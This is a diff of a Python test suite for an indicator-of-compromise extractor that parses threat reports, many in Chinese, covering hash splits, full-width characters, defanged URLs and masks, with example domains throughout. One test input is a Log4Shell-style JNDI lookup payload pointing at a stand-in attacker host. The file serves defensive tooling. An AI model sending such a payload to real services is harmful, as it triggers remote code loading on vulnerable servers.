@@ -8,6 +8,7 @@ reserved names and documentation addresses only.
 
 from __future__ import annotations
 
+import hashlib
 import json
 import sys
 from pathlib import Path
@@ -798,7 +799,7 @@ def test_score_is_provisional_until_every_value_is_judged(
     out = capsys.readouterr().out
     assert "[PROVISIONAL]" in out
     results = json.loads((reviewed_set["tmp"] / "results-t-after.json").read_text(encoding="utf-8"))
-    assert results["status"] == "provisional: 2 extracted values not judged yet"
+    assert results["status"] == "provisional: 2 values not judged yet"
     raw = results["totals"]["ttprism-raw"]
     assert raw["recall_by_class"] == {
         "plain": [1, 1, 1.0],
@@ -1239,10 +1240,35 @@ def test_a_hash_label_covers_only_its_own_block() -> None:
     assert warnings(["SHA–256", md5]) == [(1, "hash-label")]
 
 
-def test_a_sha512_split_into_two_hash_lengths_is_flagged() -> None:
-    sha512 = SPLIT + SPLIT[::-1]
-    assert ("hex-cut") in {kind for _, kind in warnings(["loader.dll " + sha512[:64], sha512[64:]])}
+def test_whole_hashes_on_adjacent_lines_are_not_flagged() -> None:
+    sha256s = [hashlib.sha256(bytes([i])).hexdigest() for i in range(5)]
+    md5s = [hashlib.md5(bytes([i])).hexdigest() for i in range(5)]  # noqa: S324
+    sha1s = [hashlib.sha1(bytes([i])).hexdigest() for i in range(5)]  # noqa: S324
+    # Lists without a label, past a page header, rows of several hashes, mixed lists.
+    assert warnings(["雜湊值", *sha256s]) == []
+    assert warnings(["SHA256", *sha256s[:2], "TLP:CLEAR", "某資安公司 12 / 20", *sha256s[2:]]) == []
+    assert (
+        warnings(["MD5 SHA1 SHA256", *(" ".join(row) for row in zip(md5s, sha1s, sha256s, strict=True))])
+        == []
+    )
+    assert warnings(["SHA256 MD5", *(" ".join(row) for row in zip(sha256s, md5s, strict=True))]) == []
+    assert warnings([md5s[0], sha256s[0], md5s[1], sha256s[1]]) == []
     assert warnings([f"{SPLIT} {SPLIT}", f"{SPLIT} {SPLIT}"]) == []
+    # A SHA-512 cut into two pieces of SHA-256 length looks the same and is not looked for (6.8); cut
+    # into pieces of other lengths, it is flagged.
+    sha512 = SPLIT + SPLIT[::-1]
+    assert warnings(["loader.dll " + sha512[:64], sha512[64:]]) == []
+    assert {kind for _, kind in warnings(["loader.dll " + sha512[:50], sha512[50:]])} == {"hex-cut"}
+
+
+def test_a_sha256_in_a_narrow_cell_before_an_md5_cell_is_flagged() -> None:
+    # Chromium centres cells: the second half of the SHA-256 shares a line with the MD5 cell.
+    sha256, md5 = hashlib.sha256(b"loader").hexdigest(), hashlib.md5(b"loader").hexdigest()  # noqa: S324
+    found = warnings(["SHA256 MD5", sha256[:32], f"{sha256[32:]} {md5}"])
+    assert ("hex-cut") in {kind for _, kind in found}
+    # A SHA-256 label above a header line still names the type for the hash-label warning.
+    found = warnings(["SHA-256", "Windows 版本", "雜湊值 檔案名稱", f"{sha256[:32]} loader.dll", sha256[32:]])
+    assert [kind for _, kind in found].count("hash-label") == 2
 
 
 def test_urls_cut_before_chinese_text_are_flagged() -> None:
@@ -1319,11 +1345,200 @@ def test_a_report_uses_full_width_writing_only_for_indicators() -> None:
     assert evaluate._writing_use(truth, "pdf", entry, judged)["uses_fullwidth_cjk"] is True
 
 
-@pytest.mark.parametrize("unit", ["." * 50 + "a", "198.51.100.7 "])
-def test_a_long_line_before_another_costs_linear_time(unit: str) -> None:
+@pytest.mark.parametrize(
+    ("unit", "end", "after"),
+    [
+        (".", "", "next"),  # the line end found past a run of punctuation
+        ("d41d8cd98f00b204e9800998ecf8427e ", "ab12  ", "cd34" + "0" * 32 + " x"),  # the hashes at a cut
+    ],
+)
+def test_the_line_end_rules_cost_linear_time(unit: str, end: str, after: str) -> None:
+    # _cut_warnings alone, since the rest of the draft costs far more per line than these rules.
     def cost(size: int) -> float:
-        body = unit * (size // len(unit))
-        tail = "0" * 20
-        return seconds_per_mb(lambda: draft([body + tail + " ", tail, "next"]), size / 1_000_000, repeat=2)
+        readings = [evaluate.ascii_reading(unit * (size // len(unit)) + end), evaluate.ascii_reading(after)]
+        results = [evaluate.line_values(reading) for reading in readings]
+        lines = [{"n": 2}, {"n": 3}]
 
-    assert cost(400_000) < 2.5 * cost(100_000), unit
+        def run() -> None:
+            evaluate._cut_warnings(evaluate._Warnings(), 0, lines, readings, results, [None, None])
+
+        return seconds_per_mb(run, size / 1_000_000, repeat=3)
+
+    assert cost(800_000) < 2.5 * cost(200_000), unit
+
+
+# --------------------------------------------------------------------------- review round 8
+
+
+def test_a_url_stopping_at_a_full_width_url_character_is_flagged() -> None:
+    for line in ("http://evil.example.com/a.php？id=1", "http://evil.example.com/a.php ？ id=1"):
+        result = draft([line])
+        assert result["values"]["url"][0]["value"] == "http://evil.example.com/a.php"
+        assert [w["kind"] for w in result["warnings"]] == ["non-ascii"], line
+    assert warnings(["http://evil.example.com/a.php？", "http://evil.example.com/b？是"]) == []
+
+
+def test_numbering_glued_to_a_value_is_flagged() -> None:
+    for fmt in ("pdf", "html"):
+        for line in ("１．198.51.100.23", "1．198.51.100.23", "１．１９８．５１．１００．２３"):
+            result = draft([line], fmt)
+            assert [w["kind"] for w in result["warnings"]] == ["loose-defang"], (fmt, line)
+    # After Chinese text a full-width dot is punctuation, not part of a name.
+    assert values(["網域．bad.example.net", "聯絡＠example.org"]) == {
+        "domain": ["bad.example.net", "example.org"]
+    }
+    assert warnings(["１．攻擊手法", "２．evil．example．com"]) == [(1, "non-ascii")]
+
+
+def test_the_defang_statistic_counts_hxxp_before_spaced_and_bracketed_colons() -> None:
+    for raw in (
+        "hxxps ： //update-check ． example ． com",
+        "hxxp(:)//evil[.]example[.]com",
+        "hxxp ://a.example.com",
+    ):
+        assert "hxxp" in [s for _, _, s in evaluate.defang_occurrences(raw)], raw
+    assert [s for _, _, s in evaluate.defang_occurrences("https:／／evil.example.com/a")] == ["／"]
+
+
+def test_file_globs_are_not_masked_names() -> None:
+    result = draft(["C:\\Users\\*\\AppData\\Startup\\*.lnk", "%TEMP%\\*.vbs", "/var/www/*.php", "*.zip"])
+    assert (result["values"], result["masked"], result["warnings"]) == ({}, {}, [])
+    # A lone asterisk before a name is a mark, not a mask: the name stays, with a warning.
+    result = draft(["*evil.example.com"])
+    assert result["values"]["domain"][0]["value"] == "evil.example.com"
+    assert [w["kind"] for w in result["warnings"]] == ["mask-next"]
+
+
+def test_values_next_to_a_mask_character_are_flagged() -> None:
+    for line in (
+        "198.51.100.2*",
+        "1*8.51.100.23",
+        "203.0.113.1xx",
+        "evil.example.co*",
+        "mail.example.gov.**",
+        "○○abc.gov.tw",
+        "ev＊l.example.com",
+        "http://ev＊l.example.com/a",
+    ):
+        assert "mask-next" in {kind for _, kind in warnings([line])}, line
+    assert warnings(["evil.example.com", "198.51.100.23"]) == []
+
+
+def test_names_after_other_schemes_are_found() -> None:
+    lines = [
+        "${jndi:ldap://evil.example.com:1389/a}",
+        "tcp://c2[.]example[.]net:443",
+        "wss://ws.example.org/s",
+    ]
+    assert values(lines) == {"domain": ["c2.example.net", "evil.example.com", "ws.example.org"]}
+
+
+def test_a_space_after_the_scheme_is_read() -> None:
+    result = draft(["https:// evil.example.com/a", "http ://b.example.com/x"])
+    assert {(e["value"], e["class"]) for e in result["values"]["url"]} == {
+        ("https://evil.example.com/a", "ascii-defang"),
+        ("http://b.example.com/x", "ascii-defang"),
+    }
+
+
+def test_urls_cut_before_a_chinese_file_name_are_flagged() -> None:
+    for lines in (
+        ["hxxp://evil[.]example[.]com/files/2023", "年度計畫 .rar 釣魚文件"],
+        ["hxxp://evil[.]example[.]com/upload/112", "年度預算.zip"],
+    ):
+        assert (0, "url-cut") in warnings(lines), lines
+    assert warnings(["http://a.example.com/x", "下載器"]) == []
+    assert warnings(["http://a.example.com/x", "中繼站 hxxp://b[.]example[.]com/y"]) == []
+
+
+def test_an_ambiguous_name_that_a_kept_url_has_as_its_host_is_refused() -> None:
+    result = draft(["C2 網域 update-", "check.example.com", "下載網址 http://update-check.example.com/a.exe"])
+    review = complete_review(
+        result,
+        remove=[{"type": "domain", "value": "check.example.com", "reason": "a fragment"}],
+        ambiguous=[
+            {
+                "type": "domain",
+                "readings": ["update-check.example.com", "updatecheck.example.com"],
+                "from_draft": False,
+                "writing": "update- / check.example.com",
+                "location": "pdf/t01.pdf page 1 line 2",
+                "reason": "wrapped at a hyphen",
+            }
+        ],
+    )
+    problems = evaluate.review_problems(result, review)
+    assert any("is the host of the URL" in p and p.startswith("ambiguous") for p in problems), problems
+
+
+def test_a_url_whose_host_cannot_be_a_name_is_flagged_and_refused() -> None:
+    result = draft(["C2：hxxp://a[.]example[.]com,hxxp://b[.]example[.]com"])
+    assert [w["kind"] for w in result["warnings"]] == ["url-unparseable"]
+    problems = evaluate.review_problems(result, complete_review(result))
+    assert any("no host that can be a name or an address" in p for p in problems), problems
+    assert evaluate.normalise_url("http://[2001:db8::1]/a")[1]
+    assert evaluate.normalise_url("http://intranet/")[1]
+
+
+def reviewed_truth(text: str, **changes: Any) -> tuple[dict[str, Any], dict[str, Any]]:
+    entry = {**report(), "id": "t01"}
+    parts = [{"format": "pdf", "start": 0, "end": len(text)}]
+    result = evaluate.draft_truth(text, entry, parts)
+    review = complete_review(result, **changes)
+    truth = {
+        "text": text,
+        "conversion": {"parts": parts},
+        "draft": result,
+        "review": review,
+        "truth": {k: [e["value"] for e in v] for k, v in review["values"].items()},
+        "ambiguous": {},
+    }
+    return truth, entry
+
+
+def test_a_body_writing_of_a_ground_truth_indicator_counts_as_use() -> None:
+    truth, entry = reviewed_truth(
+        "中繼站為 c2【.】example【.】net 與 hxxp://c3．example．org/a\nIOCs\nc2[.]example[.]net\nEND"
+    )
+    truth["truth"]["url"] = ["http://c3.example.org/b"]
+    truth["truth"]["domain"].append("c3.example.org")
+    use = evaluate._writing_use(truth, "pdf", entry, {})
+    assert (use["fullwidth_cjk_indicators_in_body"], use["uses_fullwidth_cjk"]) == (2, True)
+
+
+def test_a_value_the_reviewer_reclassed_does_not_count_as_use() -> None:
+    text = "IOCs\nc2【.】example【.】net\nEND"
+    add = {
+        "type": "domain",
+        "value": "c2.example.net",
+        "writing": "c2.example.net",
+        "class": "plain",
+        "location": "pdf/t01.pdf page 1 line 2",
+        "reason": "the page shows ASCII",
+        "warnings": ["W1"],
+    }
+    remove = {"type": "domain", "value": "c2.example.net", "reason": "class", "warnings": ["W1"]}
+    truth, entry = reviewed_truth(text, add=[add], remove=[remove])
+    assert evaluate._writing_use(truth, "pdf", entry, {})["uses_fullwidth_cjk"] is False
+
+
+def test_full_width_body_values_outside_the_truth_need_a_judgement() -> None:
+    truth, entry = reviewed_truth("聯絡 ｗｗｗ．example．org 取得\nIOCs\nc2.example.net\nEND")
+    assert evaluate.body_fullwidth_values(truth, "pdf", entry) == {("domain", "www.example.org")}
+
+
+def test_contexts_of_values_a_tool_built() -> None:
+    text = "C2 為 update-check[.]example[.]org\n參考 https://blog.example.com/2026/\nreport.html 一文"
+    contexts = evaluate._contexts(
+        text,
+        {
+            ("url", "http://update-check.example.org"),
+            ("url", "https://blog.example.com/2026/report.html"),
+            ("url", "http://only-host.example.net/x"),
+        },
+    )
+    assert contexts[("url", "http://update-check.example.org")][0].startswith("(without its scheme)")
+    assert contexts[("url", "https://blog.example.com/2026/report.html")][0].startswith(
+        "(across a line break)"
+    )
+    assert contexts[("url", "http://only-host.example.net/x")] == []
